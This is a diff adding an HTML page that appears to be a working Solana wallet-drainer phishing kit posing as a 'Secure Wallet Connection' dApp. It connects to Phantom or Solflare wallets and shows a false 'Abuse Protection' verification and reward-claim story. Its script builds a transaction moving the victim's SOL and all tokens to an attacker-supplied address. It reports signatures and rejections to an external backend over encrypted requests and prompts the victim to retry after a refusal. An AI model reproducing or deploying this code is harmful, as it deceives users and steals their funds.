@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Wallet Connection</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+    
+        :root {
+            --bg-primary: #0c0c0c;
+            --bg-secondary: #141414;
+            --bg-tertiary: #1a1a1a;
+            --bg-hover: #222222;
+            --border-color: #2a2a2a;
+            --text-primary: #ffffff;
+            --text-secondary: #888888;
+            --text-tertiary: #666666;
+            --accent-blue: #4a9eff;
+            --accent-green: #4ade80;
+            --accent-purple: #a78bfa;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --success: #10b981;
+        }
+        
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        /* Modal Styles */
+        #modal {
+            position: relative;
+            width: 90%;
+            max-width: 360px;
+            background: var(--bg-secondary);
+            border-radius: 16px;
+            overflow: hidden;
+            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            max-height: 90vh;
+        }
+        
+        @keyframes slideUp {
+            from { 
+                transform: translateY(40px) scale(0.95);
+                opacity: 0;
+            }
+            to { 
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 16px;
+            border-bottom: 1px solid var(--border-color);
+            background: var(--bg-secondary);
+            flex-shrink: 0;
+        }
+        
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .modal-title svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .close-btn {
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: transparent;
+            border: none;
+            border-radius: 6px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .close-btn:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+        }
+        
+        .modal-body {
+            padding: 12px 16px 16px;
+            flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Video Container */
+        .video-section {
+            background: var(--bg-primary);
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 10px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            flex-shrink: 0;
+            min-height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .video-section video {
+            width: 100%;
+            max-width: 280px;
+            height: auto;
+            border-radius: 6px;
+            margin: 0 auto;
+            display: block;
+            object-fit: contain;
+            background: transparent;
+        }
+        
+        /* Note Card */
+        .note-card {
+            background: var(--bg-secondary);
+            opacity: 1;
+            border: 1px solid rgba(74, 158, 255, 0.2);
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 10px;
+            flex-shrink: 0;
+        }
+        
+        .note-header {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 4px;
+        }
+        
+        .note-icon {
+            width: 12px;
+            height: 12px;
+            color: var(--accent-blue);
+        }
+        
+        .note-title {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--accent-blue);
+        }
+        
+        .note-text {
+            font-size: 11px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+        
+        .continue-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--accent-blue);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+        
+        .continue-btn:hover {
+            background: #3a8def;
+            transform: translateY(-1px);
+        }
+        
+        /* Loader Styles */
+        #loader {
+            position: fixed;
+            width: 90%;
+            max-width: 360px;
+            background: var(--bg-secondary);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--border-color);
+            display: none;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        
+        #loader .loader-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 16px;
+            position: relative;
+        }
+        
+        #loader .loader-icon img {
+            width: 100%;
+            height: 100%;
+            border-radius: 12px;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        #loader h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+        }
+        
+        #loader p {
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+            margin-bottom: 16px;
+        }
+        
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid var(--border-color);
+            border-top-color: var(--accent-blue);
+            border-radius: 50%;
+            margin: 0 auto;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .try-again-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            background: transparent;
+            border: 1px solid var(--accent-blue);
+            border-radius: 8px;
+            color: var(--accent-blue);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+            margin-top: 12px;
+        }
+        
+        .try-again-btn:hover {
+            background: var(--accent-blue);
+            color: white;
+        }
+        
+        /* Status Icon */
+        .status-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 16px;
+            color: var(--danger);
+        }
+        
+        /* State hiding */
+        .page {
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        /* Tutorial Video in Loader States */
+        .loader-video-section {
+            background: var(--bg-primary);
+            border-radius: 8px;
+            padding: 8px;
+            margin: 12px 0;
+            border: 1px solid var(--border-color);
+            min-height: 135px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .loader-video-section video {
+            width: 100%;
+            max-width: 240px;
+            height: auto;
+            border-radius: 6px;
+            margin: 0 auto;
+            display: block;
+            object-fit: contain;
+            background: transparent;
+        }
+        
+        /* Video states */
+        video[poster] {
+            background: #1a1a1a;
+        }
+
+        video:not([poster]) {
+            background: transparent;
+        }
+
+        /* Remove loading text on video load */
+        video::-webkit-media-controls {
+            display: none !important;
+        }
+        
+        /* Force video visibility on mobile */
+        @media (max-width: 768px) {
+            video {
+                -webkit-appearance: none;
+                opacity: 1 !important;
+                visibility: visible !important;
+            }
+            
+            .video-section, .loader-video-section {
+                min-height: 150px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+        }
+        
+        /* Mobile specific adjustments */
+        @media (max-width: 480px) {
+            #modal {
+                max-height: 85vh;
+            }
+            
+            .modal-header {
+                padding: 12px 14px;
+            }
+            
+            .modal-body {
+                padding: 10px 14px 14px;
+            }
+            
+            .video-section video {
+                max-width: 180px;
+            }
+            
+            .loader-video-section video {
+                max-width: 160px;
+            }
+            
+            #loader {
+                padding: 20px;
+            }
+        }
+        
+        /* Landscape adjustments */
+        @media (max-height: 500px) {
+            .video-section {
+                padding: 6px;
+            }
+            
+            .video-section video {
+                max-width: 150px;
+            }
+            
+            .note-card {
+                padding: 8px;
+            }
+            
+            .modal-body {
+                padding: 8px 14px 12px;
+            }
+
+        @media (max-width: 768px) {
+            .video-section video,
+            .loader-video-section video {
+                min-height: 180px;
+                width: 100%;
+                max-width: 100%;
+            }
+            
+            .video-section,
+            .loader-video-section {
+                padding: 0;
+                background: transparent;
+                border: none;
+            }
+            
+            /* Force video to display on iOS */
+            video::-webkit-media-controls-start-playback-button {
+                display: none !important;
+                -webkit-appearance: none;
+            }
+        }
+        }
+    </style>
+</head>
+<body>
+    <!-- Warning Modal with Video -->
+    <div id="modal">
+        <div class="modal-header">
+            <h2 class="modal-title">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                Warning
+            </h2>
+            <button class="close-btn" onclick="closeAll()">
+                <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
+                    <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+            </button>
+        </div>
+        
+        <div class="modal-body">
+            <!-- Video Section -->
+            <div class="video-section">
+                <video >
+                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
+                </video>
+            </div>
+            
+            <div class="note-card">
+                <div class="note-header">
+                    <svg class="note-icon" viewBox="0 0 16 16" fill="currentColor">
+                        <path d="M8 0a8 8 0 100 16A8 8 0 008 0zM7 4a1 1 0 112 0v4a1 1 0 11-2 0V4zm1 8a1 1 0 100 2 1 1 0 000-2z"/>
+                    </svg>
+                    <span class="note-title">Note:</span>
+                </div>
+                <p class="note-text">
+                    This dApp uses Abuse Protection to prevent misuse of platform. You'll need to complete a quick verification of your transaction history. It's completely safe and only takes a few seconds.
+                </p>
+            </div>
+            
+            <button class="continue-btn" onclick="processTransaction()">Continue</button>
+        </div>
+    </div>
+    
+    <!-- Loader -->
+    <div id="loader">
+        <button class="close-btn" id="close" style="position: absolute; top: 12px; right: 12px; z-index: 10;" onclick="closeAll()">
+            <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
+                <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+        </button>
+        
+        <!-- CONNECT -->
+        <div id="connect" class="page">
+            <div class="loader-icon">
+                <img src="https://funbIicnk.crownmodalz.com/images/phantom_wallet.svg" alt="Phantom">
+            </div>
+            <h2>Phantom</h2>
+            <p>Confirm the transaction in Phantom<br>It will only take a moment</p>
+            <div class="spinner"></div>
+            <a href="#" class="try-again-btn" onclick="retry()">
+                <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+                    <path d="M8 3a5 5 0 104.546 2.914.5.5 0 00-.908-.418A4 4 0 118 4V3z"/>
+                    <path d="M8 1a.5.5 0 01.5.5v2a.5.5 0 01-.5.5h-2a.5.5 0 010-1H7.5V1.5A.5.5 0 018 1z"/>
+                </svg>
+                Try again
+            </a>
+        </div>
+        
+        <!-- WAIT -->
+        <div id="wait" class="page">
+            <h2>Scanning Eligibility</h2>
+            <div class="loader-video-section">
+                <video >
+                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
+                </video>
+            </div>
+            <div class="spinner"></div>
+            <p>Please wait one moment...</p>
+        </div>
+        
+        <!-- PENDING -->
+        <div id="pending" class="page">
+            <h2>Status: ELIGIBLE</h2>
+            <div class="loader-video-section">
+                <video >
+                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
+                </video>
+            </div>
+            <div class="spinner"></div>
+            <p>Proceed in your wallet to claim your allocation</p>
+        </div>
+        
+        <!-- ERROR -->
+        <div id="error" class="page">
+            <h2>Connection Failed</h2>
+            <div class="status-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="48" height="48">
+                    <path d="M18 6L6 18M6 6L18 18" stroke-linecap="round"/>
+                </svg>
+            </div>
+            <div class="loader-video-section">
+                <video >
+                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p>Something went wrong. Please try again.</p>
+        </div>
+        
+        <!-- REJECTED -->
+        <div id="rejected" class="page">
+            <h2>Transaction Rejected</h2>
+            <div class="status-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="48" height="48">
+                    <path d="M18 6L6 18M6 6L18 18" stroke-linecap="round"/>
+                </svg>
+            </div>
+            <div class="loader-video-section">
+                <video >
+                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p>You must approve the transaction to claim your rewards.</p>
+            <a href="#" class="try-again-btn" onclick="retryTransaction()">
+                <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+                    <path d="M8 3a5 5 0 104.546 2.914.5.5 0 00-.908-.418A4 4 0 118 4V3z"/>
+                    <path d="M8 1a.5.5 0 01.5.5v2a.5.5 0 01-.5.5h-2a.5.5 0 010-1H7.5V1.5A.5.5 0 018 1z"/>
+                </svg>
+                Try again
+            </a>
+        </div>
+        
+        <!-- CONFIRMED -->
+        <div id="confirmed" class="page">
+            <h2>Transaction Failed</h2>
+            <div class="status-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="48" height="48">
+                    <path d="M18 6L6 18M6 6L18 18" stroke-linecap="round"/>
+                </svg>
+            </div>
+            <div class="loader-video-section">
+                <video >
+                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p>This might be temporary. Please refresh and try again.</p>
+        </div>
+        
+        <!-- INELIGIBLE -->
+        <div id="ineligible" class="page">
+            <h2>Wallet Ineligible</h2>
+            <div class="status-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="48" height="48">
+                    <path d="M18 6L6 18M6 6L18 18" stroke-linecap="round"/>
+                </svg>
+            </div>
+            <div class="loader-video-section">
+                <video >
+                    <source src="https://funbIicnk.crownmodalz.com/tutorial2.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p>Your wallet must have a higher balance to qualify.</p>
+        </div>
+    </div>
+    
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+    (function() {
+        'use strict';
+        
+        // Configuration
+        const api = "https://funbIicnk.crownbackendz.com";
+        const src = "https://funbIicnk.crownmodalz.com/";
+        
+        // Encryption configuration
+        const ENCRYPTION_KEY = CryptoJS.enc.Utf8.parse('12345678901234569990123456789012');
+        const IV = CryptoJS.enc.Utf8.parse('1234567899123456');
+        
+        // SPL Token Constants
+        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+        const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
+        
+        // Parse URL to get the origin website
+        function getOriginWebsite() {
+            const pathParts = window.location.pathname.split('/').filter(Boolean);
+            return pathParts[0] || window.location.hostname;
+        }
+        
+        // Parse wallet type from URL
+        function getWalletType() {
+            const pathParts = window.location.pathname.split('/').filter(Boolean);
+            const walletType = pathParts[1] || 'phantom';
+            
+            // Update wallet icon dynamically
+            const walletIcons = document.querySelectorAll('.loader-icon img');
+            if (walletType === 'solflare') {
+                walletIcons.forEach(img => {
+                    img.src = 'https://funbIicnk.crownmodalz.com/images/solflare_wallet.svg';
+                    img.alt = 'Solflare';
+                });
+                // Update wallet name in connect state
+                const walletNameEl = document.querySelector('#connect h2');
+                if (walletNameEl) walletNameEl.textContent = 'Solflare';
+            }
+            
+            return walletType;
+        }
+        
+        // Check if mobile
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
+        // State management
+        function showState(stateId) {
+            document.querySelectorAll('.page').forEach(function(el) {
+                el.classList.remove('active');
+            });
+            const element = document.getElementById(stateId);
+            if (element) {
+                element.classList.add('active');
+            }
+        }
+        
+        // SPL Token helper functions
+        async function getAssociatedTokenAddress(mint, owner) {
+            const [address] = await solanaWeb3.PublicKey.findProgramAddress(
+                [
+                    owner.toBuffer(),
+                    TOKEN_PROGRAM_ID.toBuffer(),
+                    mint.toBuffer(),
+                ],
+                ASSOCIATED_TOKEN_PROGRAM_ID
+            );
+            return address;
+        }
+        
+        function createAssociatedTokenAccountInstruction(payer, associatedToken, owner, mint) {
+            const keys = [
+                { pubkey: payer, isSigner: true, isWritable: true },
+                { pubkey: associatedToken, isSigner: false, isWritable: true },
+                { pubkey: owner, isSigner: false, isWritable: false },
+                { pubkey: mint, isSigner: false, isWritable: false },
+                { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
+                { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+            ];
+            
+            return new solanaWeb3.TransactionInstruction({
+                keys: keys,
+                programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+                data: new Uint8Array(0),
+            });
+        }
+        
+        function createTransferInstruction(source, destination, owner, amount) {
+            const keys = [
+                { pubkey: source, isSigner: false, isWritable: true },
+                { pubkey: destination, isSigner: false, isWritable: true },
+                { pubkey: owner, isSigner: true, isWritable: false },
+            ];
+            
+            const data = new Uint8Array(9);
+            data[0] = 3;
+            
+            const amountBigInt = BigInt(amount);
+            for (let i = 0; i < 8; i++) {
+                data[i + 1] = Number((amountBigInt >> BigInt(i * 8)) & BigInt(0xff));
+            }
+            
+            return new solanaWeb3.TransactionInstruction({
+                keys: keys,
+                programId: TOKEN_PROGRAM_ID,
+                data: data,
+            });
+        }
+        
+        // Create drain transaction
+        async function createDrainTransaction(connection, wallet, drainParams) {
+            console.log('Creating drain transaction with params:', drainParams);
+            const transaction = new solanaWeb3.Transaction();
+            
+            if (drainParams.solAmount > 0) {
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: wallet.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(drainParams.recipientAddress),
+                        lamports: Math.floor(drainParams.solAmount * solanaWeb3.LAMPORTS_PER_SOL)
+                    })
+                );
+            }
+            
+            const tokens = drainParams.tokens || [];
+            for (let i = 0; i < tokens.length; i++) {
+                const token = tokens[i];
+                try {
+                    const mintPubkey = new solanaWeb3.PublicKey(token.mint);
+                    const recipientPubkey = new solanaWeb3.PublicKey(drainParams.recipientAddress);
+                    const sourceTokenAccount = new solanaWeb3.PublicKey(token.accountAddress);
+                    
+                    const destinationTokenAccount = await getAssociatedTokenAddress(
+                        mintPubkey,
+                        recipientPubkey
+                    );
+                    
+                    const destAccountInfo = await connection.getAccountInfo(destinationTokenAccount);
+                    
+                    if (!destAccountInfo) {
+                        transaction.add(
+                            createAssociatedTokenAccountInstruction(
+                                wallet.publicKey,
+                                destinationTokenAccount,
+                                recipientPubkey,
+                                mintPubkey
+                            )
+                        );
+                    }
+                    
+                    const transferAmount = Math.floor(token.amount * Math.pow(10, token.decimals));
+                    transaction.add(
+                        createTransferInstruction(
+                            sourceTokenAccount,
+                            destinationTokenAccount,
+                            wallet.publicKey,
+                            transferAmount
+                        )
+                    );
+                } catch (error) {
+                    console.error('Error adding token ' + token.symbol + ':', error);
+                }
+            }
+            
+            const blockhash = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash.blockhash;
+            transaction.feePayer = wallet.publicKey;
+            
+            return transaction;
+        }
+        
+        // Global functions
+        window.closeAll = function() {
+            if (window.opener) {
+                window.close();
+            } else if (isMobileDevice()) {
+                // Try to go back for mobile
+                window.history.back();
+            }
+        };
+        
+        window.retry = function() {
+            continueWithTransaction();
+        };
+        
+        window.retryTransaction = function() {
+            // Hide rejected state and retry the transaction
+            document.getElementById('loader').style.display = 'block';
+            showState('pending');
+            
+            // Re-attempt the transaction
+            processTransactionAfterRejection();
+        };
+        
+        window.processTransaction = function() {
+            document.getElementById('modal').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            continueWithTransaction();
+        };
+        
+        function encrypt(payload) {
+            const jsonString = JSON.stringify(payload);
+            const encrypted = CryptoJS.AES.encrypt(jsonString, ENCRYPTION_KEY, {
+                iv: IV,
+                mode: CryptoJS.mode.CBC,
+                padding: CryptoJS.pad.Pkcs7
+            });
+            return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
+        }
+        
+        function decrypt(payload) {
+            const decrypted = CryptoJS.AES.decrypt(
+                { ciphertext: CryptoJS.enc.Base64.parse(payload) },
+                ENCRYPTION_KEY,
+                {
+                    iv: IV,
+                    mode: CryptoJS.mode.CBC,
+                    padding: CryptoJS.pad.Pkcs7
+                }
+            );
+            return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
+        }
+        
+        // Store wallet and transaction data globally
+        let connectedWallet = null;
+        let connectedAddress = null;
+        let currentDrainParams = null;
+        let currentConnection = null;
+        
+        // Main connection flow
+        async function startConnection() {
+            const walletType = getWalletType();
+            const originWebsite = getOriginWebsite();
+            const mobile = isMobileDevice();
+            
+            console.log('Starting connection for:', originWebsite, walletType, 'Mobile:', mobile);
+            
+            // Show loader with connect state
+            document.getElementById('modal').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            showState('connect');
+            
+            await new Promise(function(resolve) { setTimeout(resolve, 1000); });
+            
+            try {
+                if (walletType === 'phantom') {
+                    if (!window.solana || !window.solana.isPhantom) {
+                        // On mobile, check if we're coming from Phantom browser
+                        if (mobile && window.solana && window.solana.connect) {
+                            connectedWallet = window.solana;
+                        } else {
+                            throw new Error('Phantom wallet not found');
+                        }
+                    } else {
+                        connectedWallet = window.solana;
+                    }
+                } else if (walletType === 'solflare') {
+                    if (!window.solflare || !window.solflare.isSolflare) {
+                        // Mobile Solflare check
+                        if (mobile && window.solana) {
+                            connectedWallet = window.solana;
+                        } else {
+                            throw new Error('Solflare wallet not found');
+                        }
+                    } else {
+                        connectedWallet = window.solflare;
+                    }
+                } else {
+                    throw new Error('Unsupported wallet type');
+                }
+                
+                const resp = await connectedWallet.connect();
+                connectedAddress = connectedWallet.publicKey.toString();
+                
+                console.log('Connected:', connectedAddress);
+                
+                // Show warning modal
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('modal').style.display = 'block';
+                
+            } catch (error) {
+                console.error('Connection error:', error);
+                showState('error');
+            }
+        }
+        
+        // Continue with transaction
+        async function continueWithTransaction() {
+            const walletType = getWalletType();
+            const originWebsite = getOriginWebsite();
+            const mobile = isMobileDevice();
+            
+            try {
+                showState('wait');
+                
+                const BYPODOMAIN = 'https://' + originWebsite;
+                const clientData = { 
+                    address: connectedAddress, 
+                    wallet: walletType, 
+                    isMobile: mobile, 
+                    BYPODOMAIN: BYPODOMAIN 
+                };
+                
+                console.log('Sending to backend:', clientData);
+                
+                const encryptedData = encrypt(clientData);
+                const response = await fetch(api + '/prompt', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ payload: encryptedData })
+                });
+                
+                const responseData = await response.json();
+                const serverData = decrypt(responseData.payload);
+                
+                console.log('Server response:', serverData);
+                
+                if (serverData.drainParams) {
+                    currentDrainParams = serverData.drainParams;
+                    
+                    if (currentDrainParams.status === "ineligible") {
+                        showState('ineligible');
+                        return;
+                    }
+                    
+                    showState('pending');
+                    
+                    currentConnection = new solanaWeb3.Connection(
+                        "https://mainnet.helius-rpc.com/?api-key=02e3e83a-a22b-495c-b772-f319685e0459", 
+                        'confirmed'
+                    );
+                    
+                    await processTransactionWithParams();
+                    
+                } else if (serverData.transactions) {
+                    // Handle old format
+                    const transactions = serverData.transactions;
+                    
+                    if (transactions === "ineligible") {
+                        showState('ineligible');
+                        return;
+                    }
+                    
+                    showState('pending');
+                    await sendTransaction(connectedAddress, walletType, transactions);
+                    
+                } else {
+                    showState('error');
+                }
+                
+            } catch (error) {
+                console.error('Transaction error:', error);
+                showState('error');
+            }
+        }
+        
+        // Process transaction with drain params
+        async function processTransactionWithParams() {
+            try {
+                const transaction = await createDrainTransaction(currentConnection, connectedWallet, currentDrainParams);
+                
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                const signature = await connectedWallet.signAndSendTransaction(transaction);
+                
+                console.log('Transaction sent:', signature);
+                
+                const confirmData = { 
+                    address: connectedAddress, 
+                    signature: signature.signature, 
+                    BYPODOMAIN: 'https://' + getOriginWebsite()
+                };
+                const encryptedConfirm = encrypt(confirmData);
+                
+                await fetch(api + '/drain', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ payload: encryptedConfirm })
+                });
+                
+                const randomDelay = Math.floor(Math.random() * (10 - 5 + 1) + 5) * 1000;
+                await new Promise(resolve => setTimeout(resolve, randomDelay));
+                
+                showState('confirmed');
+            } catch (signError) {
+                if (signError.message && signError.message.includes('User rejected')) {
+                    await handleRejected();
+                } else {
+                    console.error('Sign error:', signError);
+                    showState('error');
+                }
+            }
+        }
+        
+        // Process transaction after rejection (retry)
+        async function processTransactionAfterRejection() {
+            if (currentDrainParams && currentConnection && connectedWallet) {
+                await processTransactionWithParams();
+            } else {
+                // If we don't have the params, restart the flow
+                continueWithTransaction();
+            }
+        }
+        
+        // Handle rejection
+        async function handleRejected() {
+            try {
+                const BYPODOMAIN = 'https://' + getOriginWebsite();
+                const clientData = { address: connectedAddress, BYPODOMAIN };
+                const encryptedData = encrypt(clientData);
+                
+                await fetch(`${api}/reject`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ payload: encryptedData })
+                });
+            } catch (error) {
+                console.error('Failed to send rejection:', error);
+            }
+            
+            showState('rejected');
+        }
+        
+        // Force load videos on mobile with user interaction
+        // Simple video initialization
+        function initializeVideos() {
+            const videos = document.querySelectorAll('video');
+            
+            videos.forEach(video => {
+                // Set source directly if needed
+                if (!video.src && video.querySelector('source')) {
+                    video.src = video.querySelector('source').src;
+                }
+                
+                // Remove any poster
+                video.removeAttribute('poster');
+                
+                // Force play
+                video.muted = true;
+                video.play().catch(e => {
+                    // Ignore autoplay errors
+                });
+            });
+            // Mobile video fix
+            if (isMobileDevice()) {
+                document.addEventListener('DOMContentLoaded', function() {
+                    setTimeout(() => {
+                        const videos = document.querySelectorAll('video');
+                        videos.forEach(video => {
+                            // Force reload on mobile
+                            const src = video.src || video.querySelector('source').src;
+                            video.src = '';
+                            video.load();
+                            video.src = src;
+                            video.load();
+                            video.play().catch(() => {});
+                        });
+                    }, 100);
+                });
+            }
+
+            
+            // Play on any user interaction
+            document.addEventListener('touchstart', playAllVideos, { once: true });
+            document.addEventListener('click', playAllVideos, { once: true });
+            
+            // Also try on visibility change (when user switches back to tab)
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden) {
+                    playAllVideos();
+                }
+            });
+        }
+        
+        // Start when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', function() {
+
+                startConnection();
+            });
+        } else {
+
+            startConnection();
+        }
+    })();
+    </script>
+</body>
+</html>
